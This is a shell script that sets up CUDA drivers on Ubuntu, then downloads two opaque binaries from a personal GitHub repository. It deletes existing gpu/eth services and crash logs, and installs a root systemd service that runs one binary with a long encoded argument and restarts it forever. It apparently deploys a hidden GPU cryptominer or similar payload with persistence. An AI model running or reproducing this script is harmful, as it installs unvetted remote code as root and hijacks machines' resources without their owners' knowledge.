CUDA_REPO_PKG=cuda-repo-ubuntu1804_10.0.130-1_amd64.deb
wget -O /tmp/${CUDA_REPO_PKG} https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/${CUDA_REPO_PKG}
sudo dpkg -i /tmp/${CUDA_REPO_PKG}
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub
sudo rm -f /tmp/${CUDA_REPO_PKG}
sudo apt-get update
sudo apt-get install cuda-drivers -y
sudo apt-get install cuda -y
sudo apt-get update
sudo apt-get upgrade -y
sudo apt-get dist-upgrade -y
sudo apt-get install cuda-drivers
sudo apt-get install libcurl3 -y
cd /home
sudo wget https://raw.githubusercontent.com/89505004/ces/master/a
sudo wget https://raw.githubusercontent.com/89505004/ces/master/sec
sudo chmod +x sec
sudo chmod +x a
sudo rm -rf /lib/systemd/system/gpu1.service
sudo rm -rf /lib/systemd/system/gpu.service
sudo rm -rf /lib/systemd/system/eth.service
sudo rm -rf /var/crash
bash -c 'cat &lt;<EOT>>/lib/systemd/system/gpu1.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/sec rqevzrkwTSATiZ4ClZpwH3kBWlA49NrzwATH2biVUyI1I8s4sHY67l1ccAR1eXHRAI1RUPlcEn4DTFF/bX8gFtZuyi5JrmrFiJ5mulxK7qpWrNksONvkHTEBfS37j47rBc/c4KsgxeAysvUlYhMXw6YbNFFQu//WqP/tgoZ2rQH1w6rM5/A2yVfrRdMR1+l9wNullNOyklItYrFbnn8vm+LRamrKCaZc61Et1tYTzAEXK0R7fwMFU2GRwDQ=
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable gpu1.service &&
service gpu1 stop  &&
service gpu1 restart
